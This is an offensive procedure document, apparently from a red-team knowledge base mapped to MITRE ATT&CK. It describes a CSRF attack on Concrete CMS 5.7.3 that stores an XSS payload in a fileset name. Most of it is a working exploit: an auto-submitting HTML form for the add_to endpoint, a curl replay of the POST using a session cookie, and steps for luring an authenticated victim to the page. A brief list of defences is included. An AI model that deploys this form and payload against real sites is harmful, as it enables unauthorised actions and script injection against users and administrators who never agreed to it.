---
id: proc-concrete-csrf-fileset-xss
tags:
  - csrf
  - xss-injection
  - concrete-cms
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-csrf-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:31.564Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
# Deliver-CSRF-Payload-for-Malicious-Fileset-Addition

## Summary

This procedure crafts and delivers a CSRF attack via a malicious HTML page to add a fileset in Concrete CMS 5.7.3 with an embedded stored XSS payload in the fsNewText parameter, exploiting the lack of CSRF token validation.

## Description

The /tools/required/files/add_to endpoint in Concrete CMS 5.7.3 accepts POST requests without CSRF protection, allowing attackers to trick authenticated users into creating filesets. By embedding an XSS payload like "><img src=0 onerror=alert(location)> in the fileset name, the procedure stores malicious JavaScript that executes on the fileset view page. It requires hosting the payload page and luring a victim to load it, simulating a phishing or drive-by attack.

## Requirements

1. Valid fID from prior file upload
2. Attacker-controlled web server to host the HTML page
3. Victim's authenticated session to the target CMS
4. Network access for the victim to reach both attacker page and CMS

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all POST endpoints
- Sanitize and escape all user inputs in storage/display
- Monitor for anomalous fileset creations from unexpected IPs
- Use Content-Security-Policy to block inline scripts

## Objectives

1. Inject unsanitized XSS into fileset name via CSRF
2. Persist the payload without direct authentication
3. Set up for JavaScript execution on victim access

## Instructions

### Step 1: Craft Malicious HTML Page

**Context**: Create an auto-submitting form targeting the vulnerable endpoint with the XSS payload.

Save the following as index.html on your server:

```html
<!DOCTYPE html>
<html>
<body onload="document.getElementById('f1').submit()">
<form id="f1" action="http://target/conc573/index.php/tools/required/files/add_to" method="POST">
<input type="hidden" name="task" value="add_to_sets">
<input type="hidden" name="fID[]" value="1">
<input type="hidden" name="fsNew" value="1">
<input type="hidden" name="fsNewText" value="><img src=0 onerror=alert(location)>">
<input type="hidden" name="fsNewShare" value="1">
<input type="hidden" name="fsID;1" value="2">
</form>
</body>
</html>
```

> Expected: Page loads and immediately submits the form.

### Step 2: Lure Victim and Verify Injection

**Context**: Have the victim visit the hosted page; optionally simulate with curl.

Execute [[commands/curl-csrf-post]] to test the POST:

```bash
curl -X POST http://target/conc573/index.php/tools/required/files/add_to \
  -d "task=add_to_sets" \
  -d "fID[]=1" \
  -d "fsNew=1" \
  -d "fsNewText=\"><img src=0 onerror=alert(location)>\"" \
  -d "fsNewShare=1" \
  -d "fsID;1=2" \
  --cookie "CMS_5.7.3=authenticated_session_cookie"
```

> Expected: HTTP 200 or redirect; new fileset created with payload in name.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-csrf-post]]

## Tools Used


## Tags

- csrf
- xss-injection
